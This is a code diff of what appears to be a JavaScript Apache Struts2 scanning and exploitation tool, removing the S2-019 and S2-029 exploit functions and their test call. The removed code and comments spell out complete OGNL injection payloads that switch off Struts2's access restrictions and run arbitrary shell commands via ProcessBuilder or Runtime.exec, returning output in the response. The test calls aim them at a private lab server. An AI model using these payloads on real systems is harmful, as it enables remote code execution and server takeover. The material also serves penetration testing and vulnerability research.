@@ -286,89 +286,6 @@ function fnNotEnd(url)
 	return url;
 }
 
-function doStruts2_019(url, fnCbk,bW)
-{
-	var szOldUrl = url;
-	url = fnNotEnd(url);
-	// (@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))
-	var s = ('#iswin=' + !!bW + ',#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + g_szCmdW + '\'}:{\'/bin/bash\',\'-c\',\'' + g_szCmd + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")'
-		+',#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e)),#e=new char[50000],#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e)),#e=new char[50000],#i=#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e,0,#i)),#e=new char[50000],#i=#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e,0,#i)),#e=new char[50000],#i=#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e,0,#i)),#e=new char[50000],#i=#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e,0,#i)),#wt.flush()'
-		+',#wt.close()');
-	request(fnOptHeader({method: 'GET',uri: url + "?debug=command&expression=" 
-		+ encodeURIComponent(s)
-		})
-	  , function (error, response, body){
-	  	// console.log(error||body);
-	  		if(body)
-	  		{
-	  			fnDoBody(body.replace(/\u0000/gmi,''),"s2-019",szOldUrl);
-	  		}
-	    }
-	  );
-	if(!bW)doStruts2_019(url,null,true);
-}
-
-/*
-(%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true,%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties'],%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()))
-*/
-function doStruts2_029(url, fnCbk,bW)
-{
-	var szOldUrl = url;
-	url = fnNotEnd(url);
-	this.name = this.name || "message";
-	var s1 = (g_postData),s = 
-		// s-045不允许下面的代码
-		
-		"#_memberAccess['allowPrivateAccess']=true"
-		+ ",#_memberAccess['allowProtectedAccess']=true"
-		+ ",#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties']"
-		+ ",#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#_memberAccess['allowPackageProtectedAccess']=true"
-		+ ",#_memberAccess['allowStaticMethodAccess']=true"
-		// + ",(#_memberAccess['acceptProperties']=true)"
-		
-		// + ",(#_memberAccess['excludedPackageNamePatterns']=true)"
-		// + ",("
-		// s2-048不能加下面的代码
-		
-		
-		// + ".(#_memberAccess['acceptProperties']=true)"
-		// + ".("
-		//,szDPt = g_postData.replace(/\.\(#rplc=true\)/, s);
-
-		s = "(" + s + ",#mtx=new java.lang.Boolean('false'),#context['xwork.MethodAccessor.denyMethodExecution']=#mtx"
-		+ ",#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))"
-		+ ",#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'})"
-		+ ",#p=new java.lang.ProcessBuilder(#cmds)"
-		+ ",#as=new java.lang.String()"
-		+ ",#p.redirectErrorStream(true),#process=#p.start()"
-		+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
-		+ ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
-		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
-		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
-		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
-		+ ",#as.toString()"
-		+")";
-	// console.log(encodeURIComponent(s));
-	// console.log(url);
-	request(fnOptHeader({method: 'GET',uri: url + "?" + this.name + "=" + encodeURIComponent(s)
-		/*
-		,"formData":{"message":s}
-	    ,headers:
-	    {
-	    	"User-Agent": g_szUa,
-	    	"Content-Type":"application/x-www-form-urlencoded"
-	    }//*/
-		})
-	  , function (error, response, body){
-	  		// console.log(error || body);
-	  		if(body)
-	  		{
-	  			fnDoBody(body,"s2-029",szOldUrl);
-	  		}
-	    }
-	  );
-}
-
 /*
 // payload = {'method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#parameters.tag[0]),#writer.flush(),#writer.close': '', 'tag': tag}
 在配置了 Struts2 DMI 为 True 的情况下，可以使用 method:<name> Action 前缀去调用声明为 public 的函数，
@@ -837,7 +754,7 @@ function fnMyPut(url)
 // https://github.com/Medicean/VulApps/tree/master/s/struts2
 function fnTestStruts2(szUrl2, obj)
 {
-	var a = [doStruts2_009,doStruts2_029,doStruts2_053], fnGetCpy = function()
+	var a = [doStruts2_009,doStruts2_053], fnGetCpy = function()
 	{
 		var o = {name:null};
 		if(!obj)return o;
@@ -957,7 +874,7 @@ if(program.test)
 	// doStruts2_015.call({name:null},"http://192.168.10.216:8088/S2-015/");
 	doStruts2_016.call({name:null},"http://192.168.10.216:8088/S2-016/default.action");
 	doStruts2_019.call({name:null},"http://192.168.10.216:8088/S2-019/example/HelloWorld.action");
-	doStruts2_029.call({name:null},"http://192.168.10.216:8088/S2-029/default.action");
+	// doStruts2_029.call({name:null},"http://192.168.10.216:8088/S2-029/default.action");
 	
 	runChecks("http://192.168.10.216:8082/s2-048/integration/saveGangster.action","struts2,048");
 	runChecks("http://192.168.10.216:8082/s2-046/doUpload.action","struts2,046");
